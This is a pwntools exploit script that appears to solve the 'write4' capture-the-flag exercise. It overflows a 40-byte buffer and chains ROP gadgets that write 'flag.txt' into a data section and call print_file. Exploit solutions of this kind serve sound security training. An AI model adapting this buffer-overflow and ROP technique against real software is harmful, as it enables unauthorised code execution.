from pwn import *

io = process("./write4")

#io = gdb.debug("./write4", 
#'''
#break *0x000000000040092d
#continue
#''')


mov_qword = 0x0000000000400628
pop_rdi = 0x0000000000400693
data = 0x0000000000601028
print_file = 0x0000000000400620
pop_r14_r15 = 0x0000000000400690

payload = b"a"*40
payload += p64(pop_r14_r15)
payload += p64(data)
payload += b'flag.txt'
payload += p64(pop_rdi)
payload += p64(data)
payload += p64(mov_qword)
payload += p64(print_file)

io.sendline(payload)
io.interactive()